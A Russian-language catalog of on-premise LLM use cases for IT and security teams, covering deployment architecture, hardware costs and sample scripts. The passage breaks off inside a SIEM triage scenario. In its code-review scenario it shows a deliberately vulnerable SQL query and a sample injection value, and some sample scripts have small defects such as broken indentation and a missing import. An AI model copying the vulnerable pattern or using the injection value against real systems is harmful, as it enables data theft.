# Каталог сценариев использования on-premise LLM в IT и ИБ

## Архитектура решений БЕЗ RAG и БЕЗ MCP

### Рекомендуемый стек технологий

**LLM-платформа:**
- **Основная модель:** GigaChat (российская разработка) или DeepSeek-Coder-V2 33B
- **Альтернативы:** Mistral 7B/Mixtral 8x7B, LLaMA 3.1 70B
- **Платформа развертывания:** 
  - **Ollama** (простота развертывания, встроенное API)
  - **vLLM** (высокая производительность, оптимизация для GPU)
  - **Text Generation Inference (TGI)** от HuggingFace

**RBAC и журналирование:**
```
┌─────────────────┐
│  Nginx/Traefik  │ ← SSL/TLS терминация
└────────┬────────┘
         │
┌────────▼────────┐
│   Keycloak      │ ← Аутентификация/авторизация (RBAC)
│   (или FreeIPA) │   Интеграция с AD/LDAP
└────────┬────────┘
         │
┌────────▼────────┐
│  API Gateway    │ ← Логирование запросов/ответов
│  (Kong/Tyk)     │   Rate limiting, квоты
└────────┬────────┘
         │
┌────────▼────────┐
│  LLM Backend    │ ← vLLM/Ollama с моделью
│  (vLLM/Ollama)  │
└────────┬────────┘
         │
┌────────▼────────┐
│  Audit Log      │ ← Elasticsearch + Kibana
│  (ELK Stack)    │   или Loki + Grafana
└─────────────────┘
```

**Компоненты RBAC:**
- **Keycloak:** управление пользователями, ролями, политиками доступа
- **Роли:** viewer (чтение), engineer (выполнение запросов), admin (управление)
- **API Gateway (Kong/Tyk):** проверка JWT токенов, применение политик доступа
- **Audit logging:** все запросы логируются с user_id, timestamp, prompt, response

**Журналирование включает:**
- Кто (user_id, IP)
- Когда (timestamp)
- Что запросил (prompt, параметры)
- Что получил (response, токены)
- Метрики (latency, tokens/sec)

### Оценка оборудования (10 одновременных пользователей, 30 токенов/сек, контекст 8K)

**Вариант 1: БЕЗ HA (Single Node)**

*Для модели DeepSeek-Coder-V2 33B или GigaChat аналог:*

| Компонент | Спецификация | Обоснование |
|-----------|--------------|-------------|
| GPU | 2x NVIDIA A100 40GB или 4x RTX 4090 24GB | 33B модель в FP16 ~66GB VRAM, нужен tensor parallelism |
| CPU | AMD EPYC 7543 32-core (или Intel Xeon Gold 6338) | Обработка запросов, препроцессинг |
| RAM | 256 GB DDR4 ECC | Загрузка модели, батчинг запросов |
| Storage | 2TB NVMe SSD (RAID 1) | Быстрая загрузка модели, кэширование |
| Network | 10 Gbit/s | Низкая latency для API запросов |

**Расчет производительности:**
- Пропускная способность: ~300 токенов/сек (с continuous batching в vLLM)
- Одновременно: 10 пользователей × 30 токенов/сек = 300 токенов/сек ✓
- Latency до первого токена: <2 сек

**Стоимость:** ~3-4 млн рублей (без учета российских санкционных наценок)

---

**Вариант 2: С HA (High Availability)**

*Конфигурация: 2 узла + Load Balancer*

**Узел 1 и Узел 2 (идентичны):**
| Компонент | Спецификация |
|-----------|--------------|
| GPU | 2x NVIDIA A100 40GB (или 4x RTX 4090) |
| CPU | AMD EPYC 7543 32-core |
| RAM | 256 GB DDR4 ECC |
| Storage | 2TB NVMe SSD (RAID 1) |
| Network | 10 Gbit/s |

**Load Balancer + Management:**
| Компонент | Спецификация |
|-----------|--------------|
| CPU | 16-core |
| RAM | 64 GB |
| Storage | 500GB SSD |
| Network | 10 Gbit/s, резервирование |

**Инфраструктура HA:**
- **HAProxy/Nginx** с health checks
- **Keepalived** для failover
- **Consul/etcd** для service discovery
- **Shared storage (NFS/Ceph)** для моделей и конфигураций

**Архитектура отказоустойчивости:**
```
               ┌──────────────┐
               │ Load Balancer│
               │  (HAProxy)   │
               └──────┬───────┘
                      │
        ┌─────────────┴─────────────┐
        │                           │
┌───────▼────────┐         ┌────────▼───────┐
│   LLM Node 1   │         │   LLM Node 2   │
│  (Active)      │◄───────►│  (Standby)     │
│  2x A100       │ Health  │  2x A100       │
└────────────────┘ Check   └────────────────┘
        │                           │
        └─────────────┬─────────────┘
                      │
              ┌───────▼────────┐
              │  Shared Storage│
              │  (Models, Logs)│
              └────────────────┘
```

**Расчет производительности HA:**
- В норме: оба узла работают (active-active), 600 токенов/сек суммарно
- При отказе одного: 300 токенов/сек (деградация, но работоспособность сохраняется)
- Время переключения: <30 секунд

**Стоимость:** ~8-9 млн рублей (2 узла + инфраструктура)

---

**Легковесная альтернатива (для ограниченного бюджета):**

*Модель: Mistral 7B или GigaChat Lite (7-13B параметров)*

**Без HA:**
- GPU: 1x RTX 4090 24GB или 2x RTX 3090 24GB
- CPU: 16-core
- RAM: 64 GB
- Storage: 1TB NVMe SSD
- **Стоимость:** ~500-700 тыс. рублей
- **Производительность:** 150-200 токенов/сек (достаточно для 5-7 пользователей)

**С HA:**
- 2 узла по конфигурации выше
- **Стоимость:** ~1.5-2 млн рублей

---

## Сценарии использования

### 🟢 Блок 1: БЕЗ RAG и БЕЗ MCP (простое внедрение)

---

## Сценарий 1: Генерация commit-сообщений для Git

**Текущая проблема:**
Инженеры тратят 2-5 минут на написание понятных commit-сообщений. В спешке пишут "fix", "update", "changes" — что затрудняет аудит и откат изменений.

**Как LLM помогает:**
- Анализирует `git diff` и генерирует структурированное описание изменений
- Следует convention (Conventional Commits, Angular style)
- Автоматизация через git hook или CLI wrapper

**Примеры запросов:**
```bash
# CLI команда
$ git-ai-commit

# LLM получает:
"Проанализируй git diff и создай commit message в формате Conventional Commits:
---
[вывод git diff]
---"

# Ответ LLM:
"feat(auth): добавлена двухфакторная аутентификация

- Реализован TOTP через pyotp
- Добавлены таблицы для хранения секретов
- Создан endpoint /api/auth/2fa/verify"
```

**Требуется для реализации:**
- API endpoint LLM
- Git hook (pre-commit) или CLI утилита
- Шаблон промпта для форматирования
- Нет необходимости в RAG/MCP

**Оценка эффекта:**
- ⏱️ Экономия времени: 3 мин × 50 коммитов/день = 2.5 часа/день для команды из 10 человек
- 📉 Снижение ошибок: единообразный стиль, меньше ошибок при cherry-pick/revert
- 📊 Улучшение SLA: упрощается анализ изменений при инцидентах (−20% времени на root cause analysis)

**Пример реального применения:**
```python
# git_ai_commit.py
import subprocess
import requests

def get_diff():
    return subprocess.check_output(['git', 'diff', '--cached']).decode()

def generate_commit_msg(diff):
    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': f"""Проанализируй git diff и создай commit message в формате Conventional Commits.
Используй типы: feat, fix, docs, refactor, test, chore.
Формат: type(scope): краткое описание
Далее пустая строка и детали.

Git diff:
{diff}

Commit message:""",
        'max_tokens': 200,
        'temperature': 0.3
    })
    return response.json()['choices'][0]['text'].strip()

if __name__ == '__main__':
    diff = get_diff()
    msg = generate_commit_msg(diff)
    print(msg)
    # Сохранить в .git/COMMIT_EDITMSG
```

---

## Сценарий 2: Объяснение ошибок в логах

**Текущая проблема:**
Инженеры получают cryptic error messages (stack traces, коды ошибок). Тратят 10-30 минут на гугление, чтение документации, stackoverflow.

**Как LLM помогает:**
- Получает текст ошибки → объясняет причину простым языком
- Предлагает 2-3 варианта решения
- Работает с любыми языками программирования и системами

**Примеры запросов:**
```
Пользователь копирует лог:
---
2024-12-07 15:23:41 ERROR [ansible-playbook] 
fatal: [db-prod-01]: FAILED! => {
  "msg": "Failed to connect to the host via ssh: 
  Permission denied (publickey,password)."
}
---

Промпт LLM:
"Объясни ошибку, укажи наиболее вероятные причины и предложи способы решения:
[текст ошибки]"

Ответ LLM:
"Ошибка: Ansible не может подключиться к хосту db-prod-01 по SSH.

Причины:
1. SSH-ключ не добавлен на целевой хост (нет публичного ключа в ~/.ssh/authorized_keys)
2. Используется неправильный ключ (указан другой ключ в ansible.cfg или inventory)
3. Права на приватный ключ некорректны (должны быть 600)
4. SELinux/AppArmor блокирует доступ

Решения:
1. Проверьте: ssh-copy-id user@db-prod-01
2. Убедитесь в ansible.cfg: ansible_ssh_private_key_file=/path/to/key
3. Выполните: chmod 600 ~/.ssh/id_rsa
4. Проверьте логи: sudo tail -f /var/log/auth.log на целевом хосте"
```

**Требуется для реализации:**
- Web-интерфейс или CLI для ввода ошибки
- API LLM
- Опционально: интеграция с системой логирования (webhook из ELK)

**Оценка эффекта:**
- ⏱️ Экономия времени: 20 мин поиска → 2 мин получения ответа = −90% времени
- 📉 Снижение нагрузки на senior-инженеров: junior могут решать проблемы самостоятельно
- 📊 Улучшение SLA: MTTR (Mean Time To Repair) сокращается на 15-25%

**Пример реального применения:**
Telegram-бот для IT-команды:
```python
# telegram_log_explainer_bot.py
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

def explain_error(update: Update, context):
    error_text = update.message.text
    
    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': f"""Ты опытный DevOps-инженер. Объясни ошибку, укажи причины и предложи решения:

{error_text}

Ответ:""",
        'max_tokens': 500,
        'temperature': 0.4
    })
    
    explanation = response.json()['choices'][0]['text']
    update.message.reply_text(explanation)

updater = Updater("TOKEN")
updater.dispatcher.add_handler(MessageHandler(Filters.text, explain_error))
updater.start_polling()
```

---

## Сценарий 3: Рефакторинг и оптимизация скриптов

**Текущая проблема:**
Накапливаются legacy-скрипты (bash, Python, PowerShell) с дублированием кода, без обработки ошибок, неоптимальной логикой. Рефакторинг откладывается из-за нехватки времени.

**Как LLM помогает:**
- Принимает старый скрипт → предлагает улучшенную версию
- Добавляет обработку ошибок, логирование, документацию
- Оптимизирует алгоритмы (например, замена O(n²) на O(n))

**Примеры запросов:**
```bash
# Исходный скрипт (backup.sh):
#!/bin/bash
for file in /data/*; do
  cp $file /backup/
done

# Промпт:
"Оптимизируй bash-скрипт: добавь обработку ошибок, логирование, проверку свободного места, используй rsync вместо cp:
[код скрипта]"

# Ответ LLM:
#!/bin/bash
set -euo pipefail

LOG_FILE="/var/log/backup.log"
SOURCE="/data"
DEST="/backup"
MIN_FREE_SPACE_GB=10

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

check_space() {
  free_space=$(df -BG "$DEST" | awk 'NR==2 {print $4}' | sed 's/G//')
  if [ "$free_space" -lt "$MIN_FREE_SPACE_GB" ]; then
    log "ERROR: Недостаточно места на $DEST (свободно: ${free_space}GB)"
    exit 1
  fi
}

log "INFO: Начало резервного копирования"
check_space

if rsync -av --delete "$SOURCE/" "$DEST/" >> "$LOG_FILE" 2>&1; then
  log "INFO: Резервное копирование завершено успешно"
else
  log "ERROR: Ошибка при резервном копировании"
  exit 1
fi
```

**Требуется для реализации:**
- Web-форма или CLI для загрузки скрипта
- API LLM
- Валидация выхода (syntax check)
- Опционально: интеграция с Git для создания pull request

**Оценка эффекта:**
- ⏱️ Экономия времени: рефакторинг скрипта 2 часа → 15 минут
- 📉 Снижение ошибок: −40% инцидентов из-за некорректных скриптов
- 📚 Улучшение качества кода: единообразный стиль, документация

**Пример реального применения:**
```python
# script_refactor_cli.py
import sys
import requests

def refactor_script(script_path, language):
    with open(script_path, 'r') as f:
        original_code = f.read()
    
    prompt = f"""Ты опытный DevOps-инженер. Оптимизируй {language}-скрипт:
- Добавь обработку ошибок (set -euo pipefail для bash)
- Добавь логирование
- Улучши читаемость
- Оптимизируй производительность
- Добавь комментарии

Исходный код:
```{language}
{original_code}
```

Оптимизированный код:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 2000,
        'temperature': 0.3
    })
    
    refactored = response.json()['choices'][0]['text']
    
    # Сохранить в .refactored файл
    output_path = f"{script_path}.refactored"
    with open(output_path, 'w') as f:
        f.write(refactored)
    
    print(f"✓ Рефакторинг завершен: {output_path}")

if __name__ == '__main__':
    refactor_script(sys.argv[1], sys.argv[2])
```

---

## Сценарий 4: Генерация changelog из git-истории

**Текущая проблема:**
Перед релизом нужно собрать changelog вручную: просмотреть десятки коммитов, выбрать значимые, сгруппировать по категориям. Занимает 1-2 часа.

**Как LLM помогает:**
- Анализирует git log за период → создает структурированный changelog
- Группирует изменения: Features, Bugfixes, Security, Breaking Changes
- Фильтрует незначительные коммиты (typos, formatting)

**Примеры запросов:**
```bash
$ git log --oneline v1.2.0..HEAD
a3f5e2b feat(api): добавлен endpoint для экспорта данных
d4c8f1a fix(auth): исправлена уязвимость в JWT валидации (CVE-2024-1234)
e9b3c7d docs: обновлена документация API
f1a6d4e refactor(db): оптимизация запросов к PostgreSQL
g2e7b9c chore: обновление зависимостей

# Промпт:
"Создай CHANGELOG.md из git-коммитов. Сгруппируй по категориям: Added, Changed, Fixed, Security. Пропусти технические коммиты (chore, docs, если они незначительные):
[список коммитов]"

# Ответ LLM:
## [1.3.0] - 2024-12-07

### Added
- Новый API endpoint для экспорта данных в CSV/JSON форматах

### Changed  
- Оптимизированы запросы к базе данных PostgreSQL (до 40% быстрее)

### Fixed
- Исправлена критическая уязвимость в JWT валидации (CVE-2024-1234)

### Security
- Обновлены зависимости для устранения известных уязвимостей
```

**Требуется для реализации:**
- Доступ к git repository
- CLI утилита для сбора git log
- API LLM
- Шаблон для форматирования

**Оценка эффекта:**
- ⏱️ Экономия времени: 1.5 часа → 5 минут = −95% времени
- 📋 Улучшение качества документации: полнота, структурированность
- 📊 Ускорение релизного цикла: release notes готовы автоматически

**Пример реального применения:**
```python
# generate_changelog.py
import subprocess
import requests
from datetime import datetime

def get_commits_since(tag):
    cmd = ['git', 'log', f'{tag}..HEAD', '--oneline']
    output = subprocess.check_output(cmd).decode()
    return output.strip().split('\n')

def generate_changelog(commits, version):
    commits_text = '\n'.join(commits)
    
    prompt = f"""Создай CHANGELOG.md в формате Keep a Changelog для версии {version}.
Сгруппируй коммиты по категориям:
- Added (новые функции)
- Changed (изменения в существующих функциях)
- Fixed (исправления)
- Security (безопасность)

Пропусти технические коммиты (chore, style, если они незначительные).
Используй простой язык для пользователей.

Коммиты:
{commits_text}

CHANGELOG:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 1000,
        'temperature': 0.4
    })
    
    return response.json()['choices'][0]['text']

if __name__ == '__main__':
    commits = get_commits_since('v1.2.0')
    changelog = generate_changelog(commits, '1.3.0')
    
    with open('CHANGELOG.md', 'a') as f:
        f.write('\n' + changelog)
    
    print("✓ CHANGELOG.md обновлен")
```

---

## Сценарий 5: Генерация Ansible playbooks из описания задачи

**Текущая проблема:**
Написание Ansible playbook с нуля требует знания синтаксиса, модулей, best practices. Junior-инженеры тратят 30-60 минут на простые задачи.

**Как LLM помогает:**
- Преобразует текстовое описание задачи в Ansible playbook
- Использует best practices (handlers, roles, idempotency)
- Добавляет error handling и проверки

**Примеры запросов:**
```yaml
# Запрос:
"Создай Ansible playbook: установить Nginx, настроить reverse proxy на localhost:8080, включить SSL с Let's Encrypt, перезапустить при изменении конфига"

# Ответ LLM:
---
- name: Настройка Nginx как reverse proxy с SSL
  hosts: webservers
  become: yes
  vars:
    domain: example.com
    backend_port: 8080
    
  tasks:
    - name: Установка Nginx
      apt:
        name: nginx
        state: present
        update_cache: yes
      notify: restart nginx
    
    - name: Установка Certbot
      apt:
        name: 
          - certbot
          - python3-certbot-nginx
        state: present
    
    - name: Конфигурация Nginx reverse proxy
      template:
        src: nginx_proxy.conf.j2
        dest: /etc/nginx/sites-available/{{ domain }}
      notify: restart nginx
    
    - name: Активация конфигурации
      file:
        src: /etc/nginx/sites-available/{{ domain }}
        dest: /etc/nginx/sites-enabled/{{ domain }}
        state: link
    
    - name: Получение SSL сертификата
      command: >
        certbot --nginx -d {{ domain }} 
        --non-interactive --agree-tos 
        --email admin@{{ domain }}
      args:
        creates: /etc/letsencrypt/live/{{ domain }}/fullchain.pem
    
  handlers:
    - name: restart nginx
      service:
        name: nginx
        state: restarted
```

**Требуется для реализации:**
- Web-интерфейс или CLI для ввода описания
- API LLM
- Валидация синтаксиса (ansible-lint)
- Опционально: тестирование в sandbox (molecule)

**Оценка эффекта:**
- ⏱️ Экономия времени: 45 мин → 5 мин = −90% времени
- 📉 Снижение ошибок: синтаксические ошибки практически исключены
- 🎓 Обучающий эффект: junior изучают best practices из сгенерированного кода

**Пример реального применения:**
```python
# ansible_playbook_generator.py
import requests
import subprocess
import tempfile

def generate_playbook(description):
    prompt = f"""Ты опытный DevOps-инженер. Создай Ansible playbook для задачи:

{description}

Требования:
- Используй best practices (idempotency, handlers, проверки)
- Добавь обработку ошибок
- Используй переменные для параметров
- Добавь комментарии

Playbook:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 1500,
        'temperature': 0.3
    })
    
    return response.json()['choices'][0]['text']

def validate_playbook(playbook_content):
    with tempfile.NamedTemporaryFile(mode='w', suffix='.yml', delete=False) as f:
        f.write(playbook_content)
        temp_path = f.name
    
    try:
        subprocess.check_output(['ansible-playbook', '--syntax-check', temp_path], 
                                stderr=subprocess.STDOUT)
        return True, "✓ Синтаксис корректен"
    except subprocess.CalledProcessError as e:
        return False, f"✗ Ошибка: {e.output.decode()}"

if __name__ == '__main__':
    description = input("Опишите задачу: ")
    playbook = generate_playbook(description)
    
    print("\n--- Generated Playbook ---")
    print(playbook)
    
    valid, message = validate_playbook(playbook)
    print(f"\n{message}")
```

---

## Сценарий 6: Анализ кода на уязвимости (статический анализ ИБ)

**Текущая проблема:**
Специалисты ИБ вручную проверяют код на SQL injection, XSS, hardcoded secrets, небезопасные конфигурации. Проверка одного файла занимает 15-30 минут.

**Как LLM помогает:**
- Анализирует исходный код на распространенные уязвимости OWASP Top 10
- Указывает конкретные строки с проблемами
- Предлагает безопасные альтернативы

**Примеры запросов:**
```python
# Код для анализа:
def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()

# Промпт:
"Проанализируй Python-код на уязвимости безопасности (SQL injection, XSS, secrets в коде). Укажи строки с проблемами и предложи исправления:
[код]"

# Ответ LLM:
"🔴 КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: SQL Injection (строка 2)

Проблема:
Параметр user_id напрямую подставляется в SQL-запрос без экранирования.
Атакующий может передать: user_id = '1 OR 1=1--' и получить все записи.

Исправление:
def get_user(user_id):
    query = "SELECT * FROM users WHERE id = %s"
    cursor.execute(query, (user_id,))  # Используем параметризованный запрос
    return cursor.fetchone()

Также рекомендуется:
- Валидация типа: assert isinstance(user_id, int)
- Логирование подозрительных запросов
- Rate limiting для API endpoint"
```

**Требуется для реализации:**
- Интеграция с CI/CD (GitLab CI, GitHub Actions)
- API LLM
- Парсер для извлечения кода из pull requests
- Система комментирования PR (GitLab/GitHub API)

**Оценка эффекта:**
- ⏱️ Экономия времени: 25 мин → 3 мин на файл = −88% времени
- 🔒 Снижение рисков ИБ: выявление уязвимостей до продакшена (−60% инцидентов)
- 📊 Улучшение SLA: автоматизация security review сокращает цикл разработки на 1-2 дня

**Пример реального применения:**
```python
# security_scanner.py для GitLab CI
import requests
import sys

def scan_code(file_path):
    with open(file_path, 'r') as f:
        code = f.read()
prompt = f"""Ты эксперт по кибербезопасности. Проанализируй код на уязвимости:
- SQL/NoSQL injection
- XSS (Cross-Site Scripting)
- CSRF
- Hardcoded secrets (пароли, API ключи)
- Небезопасные конфигурации (SSL verification disabled, etc.)
- Path traversal
- Command injection

Для каждой уязвимости укажи:
1. Тип уязвимости
2. Номер строки
3. Описание риска
4. Код исправления

Код:
```
{code}
```

Анализ:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 1500,
        'temperature': 0.2  # Низкая temperature для точности
    })
    
    return response.json()['choices'][0]['text']

# .gitlab-ci.yml
# security-scan:
#   script:
#     - python security_scanner.py src/app.py
#     - if grep -q "КРИТИЧЕСКАЯ" report.txt; then exit 1; fi
```

---

## Сценарий 7: Создание инструкций для пользователей

**Текущая проблема:**
IT-служба получает повторяющиеся вопросы (как подключиться к VPN, как настроить почту, как запросить доступ). Инженеры тратят 20-30 минут на создание инструкции.

**Как LLM помогает:**
- Генерирует пошаговые инструкции с скриншотами (описание мест для скриншотов)
- Адаптирует сложность под аудиторию (technical vs non-technical)
- Создает версии для разных ОС (Windows, macOS, Linux)

**Примеры запросов:**
```
# Запрос:
"Создай инструкцию для сотрудников: как подключиться к корпоративному VPN OpenVPN на Windows. Целевая аудитория - нетехнические сотрудники"

# Ответ LLM:
# Подключение к корпоративному VPN

## Требования
- Компьютер с Windows 10/11
- Логин и пароль (получить у IT-отдела)
- Конфигурационный файл client.ovpn (прикреплен к письму)

## Шаг 1: Установка OpenVPN
1. Скачайте установщик с официального сайта: https://openvpn.net/community-downloads/
2. Запустите установщик от имени администратора
3. Нажмите "Next" → "I Agree" → "Next" → "Install"
4. Дождитесь завершения установки

[Место для скриншота: окно установщика]

## Шаг 2: Настройка конфигурации
1. Откройте папку: C:\Program Files\OpenVPN\config
2. Скопируйте файл client.ovpn в эту папку
3. Если система запросит права администратора - подтвердите

[Место для скриншота: проводник с файлом]

## Шаг 3: Подключение
1. Найдите значок OpenVPN GUI в системном трее (правый нижний угол)
2. Нажмите правой кнопкой → "Connect"
3. Введите ваш логин и пароль
4. Дождитесь появления зеленого значка (подключено)

[Место для скриншота: системный трей с зеленым значком]

## Проверка подключения
Откройте браузер и перейдите на http://internal.company.com
Если страница открылась - VPN работает корректно.

## Проблемы?
Свяжитесь с IT-отделом: helpdesk@company.com или +7 (495) 123-45-67
```

**Требуется для реализации:**
- Web-интерфейс для ввода темы инструкции
- API LLM
- Шаблоны для разных типов инструкций
- Опционально: интеграция с wiki/Confluence для публикации

**Оценка эффекта:**
- ⏱️ Экономия времени: 30 мин → 5 мин = −83% времени
- 📉 Снижение нагрузки на helpdesk: −30% повторяющихся обращений
- 📚 Улучшение качества документации: единообразие, полнота

**Пример реального применения:**
```python
# instruction_generator.py
import requests

def generate_instruction(topic, audience, os_list):
    os_text = ", ".join(os_list) if len(os_list) > 1 else os_list[0]
    
    prompt = f"""Создай подробную пошаговую инструкцию для сотрудников компании.

Тема: {topic}
Целевая аудитория: {audience}
Операционные системы: {os_text}

Требования к инструкции:
- Используй простой язык без жаргона
- Нумерованные шаги
- Отметь места для скриншотов как [Место для скриншота: описание]
- Добавь раздел "Проблемы?" с контактами IT-отдела
- Если инструкция для нескольких ОС - создай отдельные секции

Инструкция:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 2000,
        'temperature': 0.4
    })
    
    return response.json()['choices'][0]['text']

# Интеграция с Confluence API
def publish_to_wiki(title, content, space_key='IT'):
    confluence_api = "https://wiki.company.com/rest/api/content"
    # ... код публикации ...

if __name__ == '__main__':
    instruction = generate_instruction(
        topic="Подключение к корпоративному VPN OpenVPN",
        audience="нетехнические сотрудники",
        os_list=["Windows", "macOS"]
    )
    print(instruction)
```

---

### 🟡 Блок 2: С RAG (средняя сложность внедрения)

---

## Сценарий 8: Интеллектуальный поиск по внутренней документации

**Текущая проблема:**
Инженеры тратят 15-45 минут на поиск информации в Confluence, Wiki, Google Docs. Поиск по ключевым словам дает нерелевантные результаты. Документация разрозненна.

**Как LLM помогает (с RAG):**
- RAG-база индексирует всю внутреннюю документацию (Confluence, SharePoint, локальные Markdown)
- Семантический поиск вместо keyword matching
- LLM синтезирует ответ из нескольких документов с указанием источников

**Примеры запросов:**
```
Запрос инженера: "Какой процесс согласования для открытия порта 443 на DMZ?"

RAG находит фрагменты из:
- Документ "Процессы ИБ.docx": раздел про firewall changes
- Confluence страница "DMZ Network Policy" 
- Ticket template в Jira

LLM генерирует ответ:
"Процесс согласования открытия порта 443 на DMZ:

1. Создайте заявку в Jira (проект SEC, тип 'Firewall Change')
2. Укажите: source IP, destination IP, порт, обоснование
3. Заявка согласуется с:
   - Руководителем вашего отдела
   - Службой ИБ (SOC)
   - Сетевым архитектором
4. После согласования выполняется в течение 2 рабочих дней
5. Изменение тестируется и документируется в change log

Источники:
- Процессы ИБ.docx, стр. 15
- https://wiki.company.com/DMZ_Network_Policy
- Jira template: SEC-FIREWALL-CHANGE"
```

**Требуется для реализации:**

**RAG-компоненты:**
- **Vector database:** Qdrant, Milvus или Weaviate (open-source)
- **Embedding model:** multilingual-e5-large (поддержка русского) или rubert-tiny
- **Document loader:** Unstructured.io для парсинга DOCX, PDF, HTML
- **Chunk strategy:** 500 токенов с overlap 50 токенов
- **Retrieval:** Top-5 документов по cosine similarity

**Источники данных:**
- Confluence (API: export pages as HTML/Markdown)
- SharePoint/OneDrive (Microsoft Graph API)
- Локальные .md/.txt файлы (file system scan)
- Процедуры ИБ (.docx, .pdf)

**Периодичность обновления:**
- Полная переиндексация: 1 раз в неделю
- Инкрементальная: каждые 6 часов (мониторинг изменений через API)

**Формат хранения:**
```json
{
  "doc_id": "confluence_page_12345",
  "title": "DMZ Network Policy",
  "chunk": "Процесс согласования firewall changes...",
  "metadata": {
    "source": "https://wiki.company.com/pages/12345",
    "updated": "2024-11-15",
    "access_level": "internal"
  },
  "embedding": [0.123, -0.456, ...]
}
```

**Оценка эффекта:**
- ⏱️ Экономия времени: 30 мин поиска → 2 мин = −93% времени
- 📉 Снижение нагрузки на senior: −40% консультаций "где найти документ X"
- 📊 Улучшение onboarding: новые сотрудники находят ответы самостоятельно (−50% времени адаптации)
- 🔍 Повышение использования документации: +60% обращений к wiki

**Пример реального применения:**

```python
# rag_documentation_search.py
from qdrant_client import QdrantClient
from sentence_transformers import SentenceTransformer
import requests

# Инициализация
qdrant = QdrantClient(host="localhost", port=6333)
embedding_model = SentenceTransformer('intfloat/multilingual-e5-large')

def search_documentation(query):
    # 1. Embedding запроса
    query_vector = embedding_model.encode(query).tolist()
    
    # 2. Поиск в векторной БД
    search_results = qdrant.search(
        collection_name="company_docs",
        query_vector=query_vector,
        limit=5
    )
    
    # 3. Формирование контекста для LLM
    context = "\n\n---\n\n".join([
        f"Источник: {hit.payload['title']} ({hit.payload['source']})\n{hit.payload['chunk']}"
        for hit in search_results
    ])
    
    # 4. Генерация ответа LLM
    prompt = f"""Ты помощник IT-службы. Ответь на вопрос сотрудника, используя информацию из документации.
Обязательно укажи источники (название документа и ссылку).

Вопрос: {query}

Документация:
{context}

Ответ:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 800,
        'temperature': 0.3
    })
    
    answer = response.json()['choices'][0]['text']
    return answer

# Пример использования
if __name__ == '__main__':
    query = "Какой процесс согласования для открытия порта 443 на DMZ?"
    answer = search_documentation(query)
    print(answer)
```

**Скрипт индексации документов:**
```python
# index_documents.py
from atlassian import Confluence
from langchain.text_splitter import RecursiveCharacterTextSplitter
from sentence_transformers import SentenceTransformer
from qdrant_client import QdrantClient
from qdrant_client.models import VectorParams, Distance

# Подключение к Confluence
confluence = Confluence(url='https://wiki.company.com', 
                       username='bot@company.com', 
                       password='token')

# Инициализация
qdrant = QdrantClient(host="localhost", port=6333)
embedding_model = SentenceTransformer('intfloat/multilingual-e5-large')
text_splitter = RecursiveCharacterTextSplitter(chunk_size=500, chunk_overlap=50)

# Создание коллекции
qdrant.recreate_collection(
    collection_name="company_docs",
    vectors_config=VectorParams(size=1024, distance=Distance.COSINE)
)

# Индексация
def index_confluence_space(space_key):
    pages = confluence.get_all_pages_from_space(space_key, expand='body.storage')
    
    for page in pages:
        # Извлечение текста
        content = page['body']['storage']['value']
        # Удаление HTML тегов (простейший вариант)
        text = re.sub('<[^<]+?>', '', content)
        
        # Разбиение на чанки
        chunks = text_splitter.split_text(text)
        
        # Индексация каждого чанка
        for i, chunk in enumerate(chunks):
            embedding = embedding_model.encode(chunk).tolist()
            
            qdrant.upsert(
                collection_name="company_docs",
                points=[{
                    "id": f"{page['id']}_chunk_{i}",
                    "vector": embedding,
                    "payload": {
                        "title": page['title'],
                        "chunk": chunk,
                        "source": f"https://wiki.company.com/pages/{page['id']}",
                        "updated": page['version']['when']
                    }
                }]
            )
        
        print(f"✓ Indexed: {page['title']} ({len(chunks)} chunks)")

index_confluence_space("IT")
index_confluence_space("SECURITY")
```

---

## Сценарий 9: Анализ инцидентов ИБ с контекстом из SIEM

**Текущая проблема:**
SOC-аналитики получают алерты из SIEM (Wazuh, OSSIM): IP попытался зайти 100 раз, обнаружена anomaly. Нужно понять: это атака или false positive? Анализ занимает 15-40 минут на инцидент.

**Как LLM помогает (с RAG):**
- RAG содержит базу знаний: MITRE ATT&CK, CVE, прошлые инциденты, whitelists
- LLM анализирует алерт + контекст → классифицирует угрозу, предлагает действия
- Автоматизация triage (сортировка critical/high/medium/low)

**Примеры запросов:**
```json
Алерт из SIEM:
{
  "timestamp": "2024-12-07T15:23:41Z",
  "event": "Multiple failed SSH login attempts",
  "source_ip": "203.0.113.45",
  "destination": "db-prod-01",
  "count": 127,
  "username": "root"
}

RAG находит:
1. IP 203.0.113.45 в базе threat intelligence (известный сканер)
2. MITRE ATT&CK: T1110.001 (Brute Force: Password Guessing)
3. Прошлый инцидент: аналогичная атака с этого IP (2024-11-20)
4. Whitelist: IP отсутствует в whitelist

LLM генерирует анализ:
"🔴 КРИТИЧЕСКИЙ ИНЦИДЕНТ: Brute-force атака на SSH

Анализ:
- Источник: 203.0.113.45 (известный сканер, зафиксирован в threat feeds)
- Цель: db-prod-01 (продуктовая база данных)
- Тип атаки: Brute Force (MITRE ATT&CK: T1110.001)
- 127 неудачных попыток входа за 2 минуты
- История: аналогичная атака 17 дней назад

Рекомендации:
1. СРОЧНО: Заблокировать IP 203.0.113.45 на firewall
2. Проверить логи на предмет успешных входов
3. Убедиться, что SSH доступен только через VPN
4. Настроить fail2ban для автоблокировки
5. Создать тикет SEC-1234 для расследования

Приоритет: CRITICAL
Предполагаемое время обработки: 1 час"
```

**Требуется для реализации:**

**RAG-компоненты:**
- **Vector DB:** Qdrant для хранения threat intelligence, CVE, MITRE ATT&CK
- **Источники данных:**
  - MITRE ATT&CK framework (JSON export)
  - CVE database (NVD JSON feeds)
  - Threat intelligence feeds (AlienVault OTX, CISA alerts)
